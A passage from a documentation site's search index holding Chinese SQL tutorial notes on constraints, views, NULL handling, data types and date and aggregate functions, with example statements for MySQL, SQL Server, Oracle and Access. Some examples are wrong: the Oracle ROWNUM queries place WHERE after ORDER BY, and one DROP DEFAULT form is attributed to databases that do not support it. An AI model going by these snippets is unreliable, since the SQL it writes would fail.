\u7ea6\u675f\uff0c\u552f\u4e00\u6807\u8bc6\u6570\u636e\u5e93\u8868\u4e2d\u7684\u6bcf\u6761\u8bb0\u5f55\uff0c\u4e3b\u952e\u5fc5\u987b\u5305\u542b\u552f\u4e00\u7684\u503c\uff0c\u4e3b\u952e\u5217\u4e0d\u80fd\u5305\u542b NULL \u503c\uff0c\u6bcf\u4e2a\u8868\u90fd\u5e94\u8be5\u6709\u4e00\u4e2a\u4e3b\u952e\uff0c\u5e76\u4e14\u6bcf\u4e2a\u8868\u53ea\u80fd\u6709\u4e00\u4e2a\u4e3b\u952e\uff1b -- CREATE TABLE \u65f6\u7684 SQL PRIMARY KEY \u7ea6\u675f -- MySQL CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), PRIMARY KEY (P_Id) ) -- SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL PRIMARY KEY, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u5982\u9700\u547d\u540d PRIMARY KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 PRIMARY KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName) ) -- ALTER TABLE \u65f6\u7684 SQL PRIMARY KEY \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD PRIMARY KEY (P_Id) -- \u5982\u9700\u547d\u540d PRIMARY KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 PRIMARY KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName) -- \u5982\u679c\u4f7f\u7528 ALTER TABLE \u8bed\u53e5\u6dfb\u52a0\u4e3b\u952e\uff0c\u5fc5\u987b\u628a\u4e3b\u952e\u5217\u58f0\u660e\u4e3a\u4e0d\u5305\u542b NULL \u503c\uff08\u5728\u8868\u9996\u6b21\u521b\u5efa\u65f6\uff09 -- \u64a4\u9500 PRIMARY KEY \u7ea6\u675f -- MySQL ALTER TABLE Persons DROP PRIMARY KEY -- SQL Server / Oracle / MS Access ALTER TABLE Persons DROP CONSTRAINT pk_PersonID \uff086\uff09FOREIGN KEY \u7ea6\u675f\uff0c\u6307\u5411\u53e6\u4e00\u4e2a\u8868\u4e2d\u7684 UNIQUE KEY(\u552f\u4e00\u7ea6\u675f\u7684\u952e)\uff0c\u7528\u4e8e\u9884\u9632\u7834\u574f\u8868\u4e4b\u95f4\u8fde\u63a5\u7684\u884c\u4e3a\uff0c\u4e5f\u80fd\u9632\u6b62\u975e\u6cd5\u6570\u636e\u63d2\u5165\u5916\u952e\u5217\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u662f\u5b83\u6307\u5411\u7684\u90a3\u4e2a\u8868\u4e2d\u7684\u503c\u4e4b\u4e00\uff1b -- CREATE TABLE \u65f6\u7684 SQL FOREIGN KEY \u7ea6\u675f -- MySQL CREATE TABLE Orders ( O_Id int NOT NULL, OrderNo int NOT NULL, P_Id int, PRIMARY KEY (O_Id), FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) ) -- SQL Server / Oracle / MS Access CREATE TABLE Orders ( O_Id int NOT NULL PRIMARY KEY, OrderNo int NOT NULL, P_Id int FOREIGN KEY REFERENCES Persons(P_Id) ) -- \u5982\u9700\u547d\u540d FOREIGN KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 FOREIGN KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Orders ( O_Id int NOT NULL, OrderNo int NOT NULL, P_Id int, PRIMARY KEY (O_Id), CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) ) -- ALTER TABLE \u65f6\u7684 SQL FOREIGN KEY \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Orders ADD FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) -- \u5982\u9700\u547d\u540d FOREIGN KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 FOREIGN KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Orders ADD CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) -- \u64a4\u9500 FOREIGN KEY \u7ea6\u675f -- MySQL ALTER TABLE Orders DROP FOREIGN KEY fk_PerOrders -- SQL Server / Oracle / MS Access ALTER TABLE Orders DROP CONSTRAINT fk_PerOrders \uff087\uff09CHECK \u7ea6\u675f\uff0c\u7528\u4e8e\u9650\u5236\u5217\u4e2d\u7684\u503c\u7684\u8303\u56f4\uff0c\u5982\u679c\u5bf9\u5355\u4e2a\u5217\u5b9a\u4e49 CHECK \u7ea6\u675f\uff0c\u90a3\u4e48\u8be5\u5217\u53ea\u5141\u8bb8\u7279\u5b9a\u7684\u503c\uff0c\u5982\u679c\u5bf9\u4e00\u4e2a\u8868\u5b9a\u4e49 CHECK \u7ea6\u675f\uff0c\u90a3\u4e48\u6b64\u7ea6\u675f\u4f1a\u57fa\u4e8e\u884c\u4e2d\u5176\u4ed6\u5217\u7684\u503c\u5728\u7279\u5b9a\u7684\u5217\u4e2d\u5bf9\u503c\u8fdb\u884c\u9650\u5236\uff1b -- CREATE TABLE \u65f6\u7684 SQL CHECK \u7ea6\u675f -- MySQL CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CHECK (P_Id>0) ) -- SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL CHECK (P_Id>0), LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u5982\u9700\u547d\u540d CHECK \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 CHECK \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT chk_Person CHECK (P_Id>0 AND City='Sandnes') ) -- ALTER TABLE \u65f6\u7684 SQL CHECK \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CHECK (P_Id>0) -- \u5982\u9700\u547d\u540d CHECK \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 CHECK \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CONSTRAINT chk_Person CHECK (P_Id>0 AND City='Sandnes') -- \u64a4\u9500 CHECK \u7ea6\u675f -- SQL Server / Oracle / MS Access ALTER TABLE Persons DROP CONSTRAINT chk_Person -- MySQL ALTER TABLE Persons DROP CHECK chk_Person \uff088\uff09DEFAULT \u7ea6\u675f\uff0c\u7528\u4e8e\u5411\u5217\u4e2d\u63d2\u5165\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u6ca1\u6709\u89c4\u5b9a\u5176\u4ed6\u7684\u503c\uff0c\u90a3\u4e48\u4f1a\u5c06\u9ed8\u8ba4\u503c\u6dfb\u52a0\u5230\u6240\u6709\u7684\u65b0\u8bb0\u5f55\uff1b -- CREATE TABLE \u65f6\u7684 SQL DEFAULT \u7ea6\u675f -- My SQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) DEFAULT 'Sandnes' ) -- ALTER TABLE \u65f6\u7684 SQL DEFAULT \u7ea6\u675f -- MySQL ALTER TABLE Persons ALTER City SET DEFAULT 'SANDNES' -- SQL Server / MS Access ALTER TABLE Persons ADD CONSTRAINT ab_c DEFAULT 'SANDNES' for City -- Oracle ALTER TABLE Persons MODIFY City DEFAULT 'SANDNES' -- \u64a4\u9500 DEFAULT \u7ea6\u675f -- MySQL ALTER TABLE Persons ALTER City DROP DEFAULT -- SQL Server / Oracle / MS Access ALTER TABLE Persons ALTER COLUMN City DROP DEFAULT \uff089\uff09Auto-increment \u4f1a\u5728\u65b0\u8bb0\u5f55\u63d2\u5165\u8868\u4e2d\u65f6\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u6570\u5b57\uff0c\u8fd9\u4e0d\u662f\u4e2a\u7ea6\u675f\uff0c\u4f46\u662f\u4f7f\u7528\u4f4d\u7f6e\u76f8\u540c\uff1b -- \u7528\u4e8e MySQL \u7684\u8bed\u6cd5 CREATE TABLE Persons ( ID int NOT NULL AUTO_INCREMENT, -- \u9ed8\u8ba4\u5f00\u59cb\u4e3a1\uff0c\u9012\u589e1\uff0c\u4e5f\u53ef\u4ee5\u89c4\u5b9a\u8d77\u59cb\u503c\uff0c\u4f8b\u5982=100 LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), PRIMARY KEY (ID) ) -- \u7528\u4e8e SQL Server \u7684\u8bed\u6cd5 CREATE TABLE Persons ( ID int IDENTITY(1,1) PRIMARY KEY, -- \u53ef\u4ee5\u5c06(1,1)\u6539\u4e3a(n,m)\uff0c\u8868\u793a\u4ee5n\u5f00\u59cb\uff0c\u9012\u589e+m LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u7528\u4e8e Access \u7684\u8bed\u6cd5 CREATE TABLE Persons ( ID Integer PRIMARY KEY AUTOINCREMENT, -- \u53ef\u4ee5\u52a0\u4e0a(n,m)\uff0c\u8868\u793a\u4ee5n\u5f00\u59cb\uff0c\u9012\u589e+m LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u7528\u4e8e Oracle \u7684\u8bed\u6cd5 CREATE SEQUENCE seq_person MINVALUE 1 START WITH 1 INCREMENT BY 1 CACHE 10 -- \u89c4\u5b9a\u4e86\u4e3a\u4e86\u63d0\u9ad8\u8bbf\u95ee\u901f\u5ea6\u8981\u5b58\u50a8\u591a\u5c11\u4e2a\u5e8f\u5217\u503c -- \u4f7f\u7528 INSERT INTO Persons (ID,FirstName,LastName) VALUES (seq_person.nextval,'Lars','Monsen') -- \u7ed9\u5df2\u7ecf\u5b58\u5728\u7684colume\u6dfb\u52a0\u81ea\u589e\u8bed\u6cd5 ALTER TABLE table_name CHANGE column_name column_name data_type(size) constraint_name AUTO_INCREMENT; -- \u4f8b\u5982 ALTER TABLE student CHANGE id id INT( 11 ) NOT NULL AUTO_INCREMENT;","title":"13\u3001\u7ea6\u675f"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#14","text":"\u89c6\u56fe\u662f\u57fa\u4e8e SQL \u8bed\u53e5\u7684\u7ed3\u679c\u96c6\u7684\u53ef\u89c6\u5316\u7684\u8868\uff0c\u89c6\u56fe\u4e2d\u7684\u5b57\u6bb5\u5c31\u662f\u6765\u81ea\u4e00\u4e2a\u6216\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\u7684\u771f\u5b9e\u7684\u8868\u4e2d\u7684\u5b57\u6bb5\uff0c\u89c6\u56fe\u9690\u85cf\u4e86\u5e95\u5c42\u7684\u8868\u7ed3\u6784\uff0c\u7b80\u5316\u4e86\u6570\u636e\u8bbf\u95ee\u64cd\u4f5c\uff0c\u52a0\u5f3a\u4e86\u5b89\u5168\u6027\uff0c\u4f7f\u7528\u6237\u53ea\u80fd\u770b\u5230\u89c6\u56fe\u6240\u663e\u793a\u7684\u6570\u636e\uff1b \uff081\uff09\u521b\u5efa\u89c6\u56fe\uff1b CREATE VIEW view_name AS SELECT column_name(s) FROM table_name WHERE condition \uff082\uff09\u66f4\u65b0\u89c6\u56fe CREATE OR REPLACE VIEW view_name AS SELECT column_name(s) FROM table_name WHERE condition -- SQL Server ALTER VIEW [ schema_name . ] view_name [ ( column [ ,...n ] ) ] [ WITH <view_attribute> [ ,...n ] ] AS select_statement [ WITH CHECK OPTION ] [ ; ] <view_attribute> ::= { [ ENCRYPTION ] [ SCHEMABINDING ] [ VIEW_METADATA ] } /* schema_name: \u89c6\u56fe\u6240\u5c5e\u67b6\u6784\u7684\u540d\u79f0\u3002 view_name: \u8981\u66f4\u6539\u7684\u89c6\u56fe\u3002 column: \u5c06\u6210\u4e3a\u6307\u5b9a\u89c6\u56fe\u7684\u4e00\u90e8\u5206\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u7684\u540d\u79f0\uff08\u4ee5\u9017\u53f7\u5206\u9694\uff09\u3002 */ \uff083\uff09\u64a4\u9500\u89c6\u56fe\uff1b DROP VIEW view_name","title":"14\u3001\u89c6\u56fe"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#15null","text":"NULL \u503c\u4ee3\u8868\u9057\u6f0f\u7684\u672a\u77e5\u6570\u636e\uff0c\u5982\u679c\u8868\u4e2d\u7684\u67d0\u4e2a\u5217\u662f\u53ef\u9009\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u5411\u8be5\u5217\u6dfb\u52a0\u503c\u7684\u60c5\u51b5\u4e0b\u63d2\u5165\u65b0\u8bb0\u5f55\u6216\u66f4\u65b0\u5df2\u6709\u7684\u8bb0\u5f55\uff0c\u8fd9\u610f\u5473\u7740\u8be5\u5b57\u6bb5\u5c06\u4ee5 NULL \u503c\u4fdd\u5b58\uff0cNULL \u503c\u7684\u5904\u7406\u65b9\u5f0f\u4e0e\u5176\u4ed6\u503c\u4e0d\u540c\uff0cNULL \u7528\u4f5c\u672a\u77e5\u7684\u6216\u4e0d\u9002\u7528\u7684\u503c\u7684\u5360\u4f4d\u7b26\uff0c\u65e0\u6cd5\u6bd4\u8f83 NULL \u548c 0\uff0c\u5b83\u4eec\u662f\u4e0d\u7b49\u4ef7\u7684\uff1b \uff081\uff09IS NULL\uff0c\u67e5\u627e NULL \u503c\uff1b -- \u4f8b\u5982 SELECT LastName,FirstName,Address FROM Persons WHERE Address IS NULL \uff082\uff09IS NOT NULL\uff0c\u67e5\u627e\u975eNULL \u503c\uff1b -- \u4f8b\u5982 SELECT LastName,FirstName,Address FROM Persons WHERE Address IS NOT NULL","title":"15\u3001NULL"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#_3","text":"","title":"\u4e09\u3001\u6570\u636e\u7c7b\u578b"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#1","text":"\u6570\u636e\u5e93\u8868\u4e2d\u7684\u6bcf\u4e2a\u5217\u90fd\u8981\u6c42\u6709\u540d\u79f0\u548c\u6570\u636e\u7c7b\u578b\uff1b \u6570\u636e\u7c7b\u578b \u63cf\u8ff0 CHARACTER(n) \u5b57\u7b26/\u5b57\u7b26\u4e32\u3002\u56fa\u5b9a\u957f\u5ea6 n\u3002 VARCHAR(n) \u6216 CHARACTER VARYING(n) \u5b57\u7b26/\u5b57\u7b26\u4e32\u3002\u53ef\u53d8\u957f\u5ea6\u3002\u6700\u5927\u957f\u5ea6 n\u3002 BINARY(n) \u4e8c\u8fdb\u5236\u4e32\u3002\u56fa\u5b9a\u957f\u5ea6 n\u3002 BOOLEAN \u5b58\u50a8 TRUE \u6216 FALSE \u503c VARBINARY(n) \u6216 BINARY VARYING(n) \u4e8c\u8fdb\u5236\u4e32\u3002\u53ef\u53d8\u957f\u5ea6\u3002\u6700\u5927\u957f\u5ea6 n\u3002 INTEGER(p) \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 p\u3002 SMALLINT \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 5\u3002 INTEGER \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 10\u3002 BIGINT \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 19\u3002 DECIMAL(p,s) \u7cbe\u786e\u6570\u503c\uff0c\u7cbe\u5ea6 p\uff0c\u5c0f\u6570\u70b9\u540e\u4f4d\u6570 s\u3002\u4f8b\u5982\uff1adecimal(5,2) \u662f\u4e00\u4e2a\u5c0f\u6570\u70b9\u524d\u6709 3 \u4f4d\u6570\uff0c\u5c0f\u6570\u70b9\u540e\u6709 2 \u4f4d\u6570\u7684\u6570\u5b57\u3002 NUMERIC(p,s) \u7cbe\u786e\u6570\u503c\uff0c\u7cbe\u5ea6 p\uff0c\u5c0f\u6570\u70b9\u540e\u4f4d\u6570 s\u3002\uff08\u4e0e DECIMAL \u76f8\u540c\uff09 FLOAT(p) \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 p\u3002\u4e00\u4e2a\u91c7\u7528\u4ee5 10 \u4e3a\u57fa\u6570\u7684\u6307\u6570\u8ba1\u6570\u6cd5\u7684\u6d6e\u70b9\u6570\u3002\u8be5\u7c7b\u578b\u7684 size \u53c2\u6570\u7531\u4e00\u4e2a\u6307\u5b9a\u6700\u5c0f\u7cbe\u5ea6\u7684\u5355\u4e00\u6570\u5b57\u7ec4\u6210\u3002 REAL \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 7\u3002 FLOAT \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 16\u3002 DOUBLE PRECISION \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 16\u3002 DATE \u5b58\u50a8\u5e74\u3001\u6708\u3001\u65e5\u7684\u503c\u3002 TIME \u5b58\u50a8\u5c0f\u65f6\u3001\u5206\u3001\u79d2\u7684\u503c\u3002 TIMESTAMP \u5b58\u50a8\u5e74\u3001\u6708\u3001\u65e5\u3001\u5c0f\u65f6\u3001\u5206\u3001\u79d2\u7684\u503c\u3002 INTERVAL \u7531\u4e00\u4e9b\u6574\u6570\u5b57\u6bb5\u7ec4\u6210\uff0c\u4ee3\u8868\u4e00\u6bb5\u65f6\u95f4\uff0c\u53d6\u51b3\u4e8e\u533a\u95f4\u7684\u7c7b\u578b\u3002 ARRAY \u5143\u7d20\u7684\u56fa\u5b9a\u957f\u5ea6\u7684\u6709\u5e8f\u96c6\u5408 MULTISET \u5143\u7d20\u7684\u53ef\u53d8\u957f\u5ea6\u7684\u65e0\u5e8f\u96c6\u5408 XML \u5b58\u50a8 XML \u6570\u636e","title":"1\u3001\u901a\u7528\u6570\u636e\u7c7b\u578b"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#2sql","text":"\u6570\u636e\u7c7b\u578b Access SQLServer Oracle MySQL PostgreSQL boolean Yes/No Bit Byte N/A Boolean integer Number (integer) Int Number Int Integer Int Integer float Number (single) Float Real Number Float Numeric currency Currency Money N/A N/A Money string (fixed) N/A Char Char Char Char string (variable) Text (<256) Memo (65k+) Varchar Varchar Varchar2 Varchar Varchar binary object OLE Object Memo Binary (fixed up to 8K) Varbinary (<8K) Image (<2GB) Long Raw Blob Text Binary Varbinary","title":"2\u3001SQL \u6570\u636e\u7c7b\u578b\u5feb\u901f\u53c2\u8003\u624b\u518c"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#3sql","text":"\uff081\uff09Microsoft Access \u6570\u636e\u7c7b\u578b \uff082\uff09MySQL \u6570\u636e\u7c7b\u578b a\u3001 Text \u7c7b\u578b b\u3001 Number \u7c7b\u578b \u6ce8\u610f\uff1a\u4ee5\u4e0a\u7684 size \u4ee3\u8868\u7684\u5e76\u4e0d\u662f\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u7684\u5177\u4f53\u7684\u957f\u5ea6\uff0c\u5982 int(4) \u5e76\u4e0d\u662f\u53ea\u80fd\u5b58\u50a84\u4e2a\u957f\u5ea6\u7684\u6570\u5b57\uff0c\u5b9e\u9645\u4e0aint(size)\u6240\u5360\u591a\u5c11\u5b58\u50a8\u7a7a\u95f4\u5e76\u65e0\u4efb\u4f55\u5173\u7cfb\u3002int(3)\u3001int(4)\u3001int(8) \u5728\u78c1\u76d8\u4e0a\u90fd\u662f\u5360\u7528 4 btyes \u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u5c31\u662f\u663e\u793a\u7684\u957f\u5ea6\u4e0d\u4e00\u6837\u800c\u5df2 \u90fd\u662f\u5360\u7528\u56db\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\uff1b c\u3001 Date \u7c7b\u578b \uff083\uff09SQL Server \u6570\u636e\u7c7b\u578b a\u3001 String \u7c7b\u578b b\u3001 Number \u7c7b\u578b c\u3001 Date \u7c7b\u578b d\u3001 \u5176\u4ed6\u6570\u636e\u7c7b\u578b","title":"3\u3001SQL \u7528\u4e8e\u5404\u79cd\u6570\u636e\u5e93\u7684\u6570\u636e\u7c7b\u578b"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#_4","text":"","title":"\u56db\u3001\u51fd\u6570"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#1null","text":"\u7528\u4e8e\u5904\u7406\u503c\u4e3aNULL\uff0c\u9700\u8981\u66ff\u6362\u7684\u60c5\u51b5\uff1b -- SQL Server / MS Access\uff0c\u8868\u793a\u5982\u679cUnitsOnOrder\u5217\u4e2d\u503c\u4e3aNULL\uff0c\u66ff\u6362\u4e3a0\u8fdb\u884c\u8ba1\u7b97 SELECT ProductName,UnitPrice*(UnitsInStock+ISNULL(UnitsOnOrder,0)) FROM Products -- Oracle\uff0c\u6ca1\u6709ISNULL()\u51fd\u6570\uff0c\u4f46\u662f\u6709NVL()\uff0c\u540c\u4e0a SELECT ProductName,UnitPrice*(UnitsInStock+NVL(UnitsOnOrder,0)) FROM Products -- MySQL SELECT ProductName,UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder,0)) FROM Products -- \u6216 SELECT ProductName,UnitPrice*(UnitsInStock+COALESCE(UnitsOnOrder,0)) FROM Products","title":"1\u3001NULL"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#2date","text":"\uff081\uff09MySQL \u4e2d\u6700\u91cd\u8981\u7684\u5185\u5efa\u65e5\u671f\u51fd\u6570\uff1a \u51fd\u6570 \u63cf\u8ff0 NOW() \u8fd4\u56de\u5f53\u524d\u7684\u65e5\u671f\u548c\u65f6\u95f4 CURDATE() \u8fd4\u56de\u5f53\u524d\u7684\u65e5\u671f CURTIME() \u8fd4\u56de\u5f53\u524d\u7684\u65f6\u95f4 DATE() \u63d0\u53d6\u65e5\u671f\u6216\u65e5\u671f/\u65f6\u95f4\u8868\u8fbe\u5f0f\u7684\u65e5\u671f\u90e8\u5206 EXTRACT() \u8fd4\u56de\u65e5\u671f/\u65f6\u95f4\u7684\u5355\u72ec\u90e8\u5206 DATE_ADD() \u5411\u65e5\u671f\u6dfb\u52a0\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694 DATE_SUB() \u4ece\u65e5\u671f\u51cf\u53bb\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694 DATEDIFF() \u8fd4\u56de\u4e24\u4e2a\u65e5\u671f\u4e4b\u95f4\u7684\u5929\u6570 DATE_FORMAT() \u7528\u4e0d\u540c\u7684\u683c\u5f0f\u663e\u793a\u65e5\u671f/\u65f6\u95f4 MySQL \u4f7f\u7528\u4e0b\u5217\u6570\u636e\u7c7b\u578b\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u65e5\u671f\u6216\u65e5\u671f/\u65f6\u95f4\u503c\uff1a DATE - \u683c\u5f0f\uff1aYYYY-MM-DD DATETIME - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS TIMESTAMP - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS YEAR - \u683c\u5f0f\uff1aYYYY \u6216 YY \uff082\uff09SQL Server \u4e2d\u6700\u91cd\u8981\u7684\u5185\u5efa\u65e5\u671f\u51fd\u6570\uff1a \u51fd\u6570 \u63cf\u8ff0 GETDATE() \u8fd4\u56de\u5f53\u524d\u7684\u65e5\u671f\u548c\u65f6\u95f4 DATEPART() \u8fd4\u56de\u65e5\u671f/\u65f6\u95f4\u7684\u5355\u72ec\u90e8\u5206 DATEADD() \u5728\u65e5\u671f\u4e2d\u6dfb\u52a0\u6216\u51cf\u53bb\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694 DATEDIFF() \u8fd4\u56de\u4e24\u4e2a\u65e5\u671f\u4e4b\u95f4\u7684\u65f6\u95f4 CONVERT() \u7528\u4e0d\u540c\u7684\u683c\u5f0f\u663e\u793a\u65e5\u671f/\u65f6\u95f4 SQL Server \u4f7f\u7528\u4e0b\u5217\u6570\u636e\u7c7b\u578b\u5728\u6570\u636e\u5e93\u4e2d\u5b58\u50a8\u65e5\u671f\u6216\u65e5\u671f/\u65f6\u95f4\u503c\uff1a DATE - \u683c\u5f0f\uff1aYYYY-MM-DD DATETIME - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS SMALLDATETIME - \u683c\u5f0f\uff1aYYYY-MM-DD HH:MM:SS TIMESTAMP - \u683c\u5f0f\uff1a\u552f\u4e00\u7684\u6570\u5b57 \uff083\uff09\u5982\u679c\u60a8\u5e0c\u671b\u4f7f\u67e5\u8be2\u7b80\u5355\u4e14\u66f4\u6613\u7ef4\u62a4\uff0c\u90a3\u4e48\u8bf7\u4e0d\u8981\u5728\u65e5\u671f\u4e2d\u4f7f\u7528\u65f6\u95f4\u90e8\u5206\uff0c\u5982\u679c\u6ca1\u6709\u65f6\u95f4\u90e8\u5206\uff0c\u9ed8\u8ba4\u65f6\u95f4\u4e3a 00:00:00\uff0c\u6240\u4ee5\u53ef\u80fd\u67e5\u4e0d\u5230\u7ed3\u679c\uff1b","title":"2\u3001Date"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#3aggregate","text":"SQL Aggregate \u51fd\u6570\u8ba1\u7b97\u4ece\u5217\u4e2d\u53d6\u5f97\u7684\u503c\uff0c\u8fd4\u56de\u4e00\u4e2a\u5355\u4e00\u7684\u503c\uff1b \uff081\uff09AVG() \u51fd\u6570\u8fd4\u56de\u6570\u503c\u5217\u7684\u5e73\u5747\u503c\uff1b SELECT AVG(column_name) FROM table_name \uff082\uff09COUNT() \u51fd\u6570\u8fd4\u56de\u5339\u914d\u6307\u5b9a\u6761\u4ef6\u7684\u884c\u6570\uff1b -- COUNT(column_name) \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u503c\u7684\u6570\u76ee\uff08NULL \u4e0d\u8ba1\u5165\uff09 SELECT COUNT(column_name) FROM table_name; -- COUNT(*) \u51fd\u6570\u8fd4\u56de\u8868\u4e2d\u7684\u8bb0\u5f55\u6570 SELECT COUNT(*) FROM table_name; -- COUNT(DISTINCT column_name) \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u4e0d\u540c\u503c\u7684\u6570\u76ee SELECT COUNT(DISTINCT column_name) FROM table_name; -- COUNT(DISTINCT) \u9002\u7528\u4e8e ORACLE \u548c Microsoft SQL Server\uff0c\u4f46\u662f\u65e0\u6cd5\u7528\u4e8e Microsoft Access \uff083\uff09FIRST() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u7684\u5217\u4e2d\u7b2c\u4e00\u4e2a\u8bb0\u5f55\u7684\u503c\uff1b -- \u53ea\u6709 MS Access \u652f\u6301 FIRST() \u51fd\u6570 SELECT FIRST(column_name) FROM table_name; -- SQL Server SELECT TOP 1 column_name FROM table_name ORDER BY column_name ASC; -- MySQL SELECT column_name FROM table_name ORDER BY column_name ASC LIMIT 1; -- Oracle SELECT column_name FROM table_name ORDER BY column_name ASC WHERE ROWNUM <=1; \uff084\uff09LAST() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u7684\u5217\u4e2d\u6700\u540e\u4e00\u4e2a\u8bb0\u5f55\u7684\u503c\uff1b -- \u53ea\u6709 MS Access \u652f\u6301 LAST() \u51fd\u6570 SELECT LAST(column_name) FROM table_name; -- SQL Server SELECT TOP 1 column_name FROM table_name ORDER BY column_name DESC; -- MySQL SELECT column_name FROM table_name ORDER BY column_name DESC LIMIT 1; -- Oracle SELECT column_name FROM table_name ORDER BY column_name DESC WHERE ROWNUM <=1; \uff085\uff09MAX() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u6700\u5927\u503c\uff1b SELECT MAX(column_name) FROM table_name; \uff086\uff09MIN() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u5217\u7684\u6700\u5c0f\u503c\uff1b SELECT MIN(column_name) FROM table_name; \uff087\uff09SUM() \u51fd\u6570\u8fd4\u56de\u6570\u503c\u5217\u7684\u603b\u6570\uff1b SELECT SUM(column_name) FROM 